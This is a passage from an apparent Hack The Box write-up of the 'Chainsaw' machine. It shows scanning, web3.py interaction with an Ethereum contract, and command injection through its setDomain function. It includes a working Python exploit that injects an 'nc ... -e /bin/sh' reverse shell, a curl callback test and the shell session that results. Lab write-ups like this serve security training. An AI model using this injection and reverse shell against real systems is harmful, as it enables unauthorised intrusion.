<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -p 9810 -sV -sT -sC -o nmap9810 chainsaw.htb                                                                                                                          </span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 19:24 EET                                                                                                                                                    </span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">9810&#x2F;tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP&#x2F;1.1 400 Bad Request</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain</span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:25:01 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP&#x2F;1.1 400 Bad Request</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain</span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:24:27 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP&#x2F;1.1 200 OK</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain                                                                                                                                                                                    </span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:24:30 GMT</span><br><span class="line">|_    Connection: close</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :                                      </span><br><span class="line">SF-Port9810-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;11&#x2F;22%Time&#x3D;5DD819CA%P&#x3D;x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:etRequest,118,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-All</span><br><span class="line">SF:ow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type,\x20Accept,</span><br><span class="line">SF:\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-</span><br><span class="line">SF:Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;plain\r\nDate:\x20Fri,\x2</span><br><span class="line">SF:022\x20Nov\x202019\x2017:24:27\x20GMT\r\nConnection:\x20close\r\n\r\n40</span><br><span class="line">SF:0\x20Bad\x20Request&quot;)%r(HTTPOptions,100,&quot;HTTP&#x2F;1\.1\x20200\x20OK\r\nAcce</span><br><span class="line">SF:ss-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Ty</span><br><span class="line">SF:pe,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nA</span><br><span class="line">SF:ccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;plain\r\nDa</span><br><span class="line">SF:te:\x20Fri,\x2022\x20Nov\x202019\x2017:24:30\x20GMT\r\nConnection:\x20c</span><br><span class="line">SF:lose\r\n\r\n&quot;)%r(FourOhFourRequest,118,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Requ</span><br><span class="line">SF:est\r\nAccess-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x2</span><br><span class="line">SF:0Content-Type,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:</span><br><span class="line">SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;</span><br><span class="line">SF:plain\r\nDate:\x20Fri,\x2022\x20Nov\x202019\x2017:25:01\x20GMT\r\nConne</span><br><span class="line">SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.55 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>It responded to <code>HTTP</code> requests which means that the <code>JSON-RPC</code> server is <code>HTTP</code> based.<br>There are a lot of ways to interact with <code>ethereum</code> smart contracts, I used <a href="https://web3py.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener"><code>web3</code> python library</a>. (<a href="https://www.dappuniversity.com/articles/web3-py-intro" target="_blank" rel="noopener">A great reference</a>)<br>I imported <code>Web3</code> and <code>eth</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br></pre></td></tr></table></figure>
<p>Then I created a new <code>web3</code> connection to <code>http://chainsaw.htb:9810</code> and saved it in a variable called <code>w3</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br></pre></td></tr></table></figure>
<p>To interact with the smart contract we need two things:</p>
<ul>
<li>The address of the contract: we got the address earlier from the <code>ftp</code> server (Note: that address changes everytime the box is reset).</li>
<li>The <a href="https://en.wikipedia.org/wiki/Application_binary_interface" target="_blank" rel="noopener"><code>ABI</code></a> (Application Binary Interface) of the contract: We can get it from the contract source.</li>
</ul>
<p>To get the <code>ABI</code> I used the <a href="https://ethereum.github.io/browser-solidity/" target="_blank" rel="noopener"><code>solidity IDE</code></a> to compile the contract then I clicked on “Details” and copied the <code>ABI</code>:<br><img src="/images/hackthebox/chainsaw/1.png" alt=""><br>I saved it in a file (<code>ABI.txt</code>) then I executed <code>echo -n</code> on <code>cat ABI.txt</code> to make it a single line:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# echo -n &#96;cat ABI.txt&#96;</span><br><span class="line">[ &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;getDomain&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;_value&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;setDomain&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125; ]</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>I saved the <code>ABI</code> and the address in variables:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br></pre></td></tr></table></figure>
<p>Then I finally created the contract representation and saved it in the variable <code>contract</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br></pre></td></tr></table></figure>
<p>By using the <code>functions</code> property we can call any function that the contract has, let’s call the function <code>getDomain()</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure>
<p>Final <code>test.py</code> looks like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure>
<p>Let’s run it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">google.com</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>It’s working fine, let’s try to change the domain by using <code>setDomain()</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.functions.setDomain(<span class="string">"test"</span>).transact()</span><br></pre></td></tr></table></figure>

<p><em>Note: When passing arguments to functions we have to use <code>transact()</code> instead of <code>call()</code>, to use <code>transact()</code> we need an account, that’s why I added this line:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p><code>test.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">contract.functions.setDomain(<span class="string">"test"</span>).transact()</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">test</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>Great, now for the exploitation part.</p>
<h2 id="WeaponizedPing-Exploitation"><a href="#WeaponizedPing-Exploitation" class="headerlink" title="WeaponizedPing: Exploitation"></a>WeaponizedPing: Exploitation</h2><p>Let’s try to inject commands in the domain name and see if it’ll work, I injected a <code>curl</code> command and I ran a python server on port 80:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.functions.setDomain(<span class="string">"test; curl http://10.10.xx.xx/"</span>).transact()</span><br></pre></td></tr></table></figure>
<p><code>test.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">contract.functions.setDomain(<span class="string">"test; curl http://10.10.xx.xx/"</span>).transact()</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">test; curl http:&#x2F;&#x2F;10.10.xx.xx&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>After a few seconds I got a request:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.142 - - [22&#x2F;Nov&#x2F;2019 20:59:23] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
<p>Based on these tests I wrote this small exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(address, ip, port)</span>:</span></span><br><span class="line">	print(YELLOW + <span class="string">"[+] Starting"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Connecting to chainsaw.htb:9810"</span>)</span><br><span class="line">	w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">	print(GREEN + <span class="string">"[*] Connection Established"</span>)</span><br><span class="line">	w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Creating the contract representation"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Address: &#123;&#125;"</span>.format(address))</span><br><span class="line">	abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">	contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">	print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Injecting Reverse Shell:"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"  [!] IP: &#123;&#125;"</span>.format(ip))</span><br><span class="line">	print(YELLOW + <span class="string">"  [!] PORT: &#123;&#125;"</span>.format(port))</span><br><span class="line">	contract.functions.setDomain(<span class="string">"pwn3d;nc &#123;&#125; &#123;&#125; -e /bin/sh"</span>.format(ip,port)).transact()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Domain Changed Successfully, New Value: "</span> + contract.functions.getDomain().call())</span><br><span class="line">	print(GREEN + <span class="string">"[*] Now wait for your reverse shell, Exiting..."</span>)</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) != <span class="number">4</span> <span class="keyword">or</span> argv[<span class="number">1</span>] == <span class="string">"-h"</span>:</span><br><span class="line">	print(YELLOW + <span class="string">"[!] Usage: &#123;&#125; [contract address] [ip] [port]"</span>.format(argv[<span class="number">0</span>]))</span><br><span class="line">	exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	address = argv[<span class="number">1</span>]</span><br><span class="line">	ip = argv[<span class="number">2</span>]</span><br><span class="line">	port = argv[<span class="number">3</span>]</span><br><span class="line">	exploit(address, ip, port)</span><br></pre></td></tr></table></figure>
<p>I listened on port 1337 and ran the exploit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;exploit.py 0x479C21df57F2deaB052C466E4de7E82539F6A988 10.10.xx.xx 1337</span><br><span class="line">[+] Starting</span><br><span class="line">[+] Connecting to chainsaw.htb:9810</span><br><span class="line">[*] Connection Established</span><br><span class="line">[+] Creating the contract representation</span><br><span class="line">[+] Address: 0x479C21df57F2deaB052C466E4de7E82539F6A988</span><br><span class="line">[*] Done</span><br><span class="line">[+] Injecting Reverse Shell:</span><br><span class="line">  [!] IP: 10.10.xx.xx</span><br><span class="line">  [!] PORT: 1337</span><br><span class="line">[*] Domain Changed Successfully, New Value: pwn3d;nc 10.10.xx.xx 1337 -e &#x2F;bin&#x2F;sh</span><br><span class="line">[*] Now wait for your reverse shell, Exiting...</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure>
<p>And I got a shell immediately as a user called <code>administrator</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.142.</span><br><span class="line">Ncat: Connection from 10.10.10.142:49262.</span><br><span class="line">whoami</span><br><span class="line">administrator</span><br><span class="line">which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ export TERM&#x3D;screen</span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$</span><br></pre></td></tr></table></figure>

<h2 id="ipfs-–-gt-SSH-as-bobby-–-gt-User-Flag"><a href="#ipfs-–-gt-SSH-as-bobby-–-gt-User-Flag" class="headerlink" title="ipfs –&gt; SSH as bobby –&gt; User Flag"></a>ipfs –&gt; SSH as bobby –&gt; User Flag</h2><p>There were 2 users on the box, <code>administrator</code> and <code>bobby</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ cd &#x2F;home</span><br><span class="line">administrator@chainsaw:&#x2F;home$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root          root          4096 Dec 12  2018 .</span><br><span class="line">drwxr-xr-x 25 root          root          4096 Dec 20  2018 ..</span><br><span class="line">drwxr-x---  8 administrator administrator 4096 Dec 20  2018 administrator</span><br><span class="line">drwxr-x---  9 bobby         bobby         4096 Jan 23  2019 bobby</span><br><span class="line">administrator@chainsaw:&#x2F;home$</span><br></pre></td></tr></table></figure>
<p><code>administrator</code> had no permission to access <code>bobby</code>‘s home directory:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home$ cd bobby&#x2F;</span><br><span class="line">bash: cd: bobby&#x2F;: Permission denied</span><br><span class="line">administrator@chainsaw:&#x2F;home$</span><br></pre></td></tr></table></figure>
<p>In <code>administrator</code>‘s home directory I noticed a directory called <code>.ipfs</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home$ cd administrator&#x2F;</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ls -la</span><br><span class="line">total 104</span><br><span class="line">drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .</span><br><span class="line">drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout</span><br><span class="line">-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv</span><br><span class="line">drwxrwxr-x 5 administrator administrator  4096 Jan 23  2019 .ipfs</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2</span><br><span class="line">-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt</span><br><span class="line">-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf</span><br><span class="line">-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The InterPlanetary File System (IPFS) is a <a href="https://en.wikipedia.org/wiki/Communications_protocol" target="_blank" rel="noopener">protocol</a> and <a href="https://en.wikipedia.org/wiki/Peer-to-peer" target="_blank" rel="noopener">peer-to-peer</a> network for storing and sharing data in a <a href="https://en.wikipedia.org/wiki/Distributed_file_system" target="_blank" rel="noopener">distributed file system</a>. IPFS uses <a href="https://en.wikipedia.org/wiki/Content-addressable_storage" target="_blank" rel="noopener">content-addressing</a> to uniquely identify each file in a <a href="https://en.wikipedia.org/wiki/Global_Namespace" target="_blank" rel="noopener">global namespace</a> connecting all computing devices. -<a href="https://en.wikipedia.org/wiki/InterPlanetary_File_System" target="_blank" rel="noopener">Wikipedia</a></p>
</blockquote>
